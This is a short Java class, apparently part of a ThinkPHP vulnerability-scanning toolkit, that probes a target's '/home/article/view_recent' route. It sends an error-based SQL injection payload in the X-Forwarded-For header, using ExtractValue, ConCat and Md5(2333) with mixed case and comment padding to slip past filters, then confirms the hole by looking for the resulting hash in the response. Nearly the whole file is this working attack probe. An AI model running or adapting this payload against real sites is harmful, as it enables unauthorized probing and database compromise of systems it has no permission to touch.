package com.leishianquan.exp;

import com.leishianquan.model.BasePayload;
import com.leishianquan.util.Dialog;
import com.leishianquan.util.HttpTool;

public class thinkphp_view_recent_xff_sqli implements BasePayload {
    private static final String CheckStr="56540676a129760a";

    public boolean checkVUL(String url) throws Exception{

        try {
            String test_result = HttpTool.get_xforward_HttpReuest(url + "/index.php?s=/home/article/view_recent/name/1", "utf-8","1')And/**/ExtractValue(1,ConCat(0x5c,(sElEct/**/Md5(2333))))#");
            if(test_result.contains(CheckStr)){
                return true;}

        } catch (Exception e) {
//            Dialog.alert_Dialog("txf提示你",null,"连接超时");
        }
        return false;
    }


}